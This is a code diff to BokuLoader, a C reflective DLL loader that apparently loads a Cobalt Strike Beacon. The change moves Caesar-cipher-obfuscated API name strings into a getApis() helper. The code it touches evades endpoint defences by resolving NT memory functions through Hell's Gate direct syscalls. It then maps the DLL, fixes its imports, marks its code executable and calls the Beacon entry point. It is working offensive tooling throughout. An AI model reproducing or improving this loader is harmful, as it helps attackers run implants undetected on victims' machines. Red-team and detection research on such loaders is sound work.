@@ -94,6 +94,7 @@ typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned int, void *);
 
 __declspec(dllexport) void* WINAPI BokuLoader()
 {
+    APIS api;
     LONG32 status;
     SIZE_T size;
     void * base;
@@ -106,44 +107,14 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     rdll_src.dllBase = getRdllBase(BokuLoaderStart); // search backwards from the start of BokuLoader
     parseDLL(&rdll_src);
 
-    // Get Export Directory and Export Tables for NTDLL.DLL
-    // Original String:   nTDlL.Dll // String Length:     9 // Caesar Chiper Key: 513556 // Chiper String:     hX`BX
-    unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
-    basicCaesar_Decrypt(9, s_ntdll, 513556);
-    Dll ntdll;
-    ntdll.dllBase = getDllBase((char *)s_ntdll);
-    parseDLL(&ntdll);
-
-    // Get Export Directory and Export Tables for Kernel32.dll
-    // Original String:   kERneL32.dLl // String Length:     12 // Caesar Chiper Key: 1 // Chiper String:     lFSofM43/eMm
-    unsigned char s_k32[] = {0x6c,0x46,0x53,0x6f,0x66,0x4d,0x34,0x33,0x2f,0x65,0x4d,0x6d,0x01};
-    basicCaesar_Decrypt(13, s_k32, 1);
-    Dll k32;
-    k32.dllBase = getDllBase((char *)s_k32);
-    parseDLL(&k32);
-
-    unsigned char kstr1[] = {0x36,0x59,0x4b,0x4e,0x36,0x53,0x4c,0x5c,0x4b,0x5c,0x63,0x2b,0x00};
-    basicCaesar_Decrypt(12, kstr1, 234);
-    tLoadLibraryA pLoadLibraryA = xGetProcAddress(kstr1, &k32);
-
-    unsigned char ntstr2[] = {0x87,0xad,0x7a,0xa5,0xa5,0xa8,0x9c,0x9a,0xad,0x9e,0x8f,0xa2,0xab,0xad,0xae,0x9a,0xa5,0x86,0x9e,0xa6,0xa8,0xab,0xb2,0x00};
-    basicCaesar_Decrypt(23, ntstr2, 1337);
-    tNtAlloc pNtAllocateVirtualMemory = xGetProcAddress(ntstr2, &ntdll);
-
-    unsigned char ntstr3[] = {0xc4,0xea,0xc6,0xe8,0xe5,0xea,0xdb,0xd9,0xea,0xcc,0xdf,0xe8,0xea,0xeb,0xd7,0xe2,0xc3,0xdb,0xe3,0xe5,0xe8,0xef,0x00};
-    basicCaesar_Decrypt(22, ntstr3, 1010101110);
-    tNtProt pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);
-
-    unsigned char ntstr4[] = {0x23,0x49,0x1b,0x47,0x3a,0x3a,0x2b,0x3e,0x47,0x49,0x4a,0x36,0x41,0x22,0x3a,0x42,0x44,0x47,0x4e,0x00};
-    basicCaesar_Decrypt(19, ntstr4, 13013);
-    tNtFree pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);
+    getApis(&api);
 
     // Allocate new memory to write our new RDLL too
     Dll rdll_dst;
     rdll_dst.dllBase = NULL;
     base = NULL;
     size = rdll_src.size;
-    HellsGate(getSyscallNumber(pNtAllocateVirtualMemory));
+    HellsGate(getSyscallNumber(api.pNtAllocateVirtualMemory));
     status = ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
     if (!NT_SUCCESS(status))
         return NULL;
@@ -154,7 +125,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     base = rdll_dst.dllBase;
     size = 4096;
     //size = rdll_src.SizeOfHeaders;
-    HellsGate(getSyscallNumber(pNtFreeVirtualMemory));
+    HellsGate(getSyscallNumber(api.pNtFreeVirtualMemory));
     status = ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
   
     // Save .text section address and size for destination RDLL so we can make it RE later
@@ -251,7 +222,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         dll_import.dllBase = getDllBase(importName);
         // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
         if (dll_import.dllBase == NULL){
-            dll_import.dllBase = pLoadLibraryA(importName);
+            dll_import.dllBase = api.LoadLibraryA(importName);
         }
         __asm__(
             "xor rcx, rcx \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
@@ -463,7 +434,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     base = rdll_dst.TextSection;
     size = rdll_dst.TextSectionSize;
     unsigned int newprotect = PAGE_EXECUTE_READ;
-    HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
+    HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
     ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
     rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
     ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
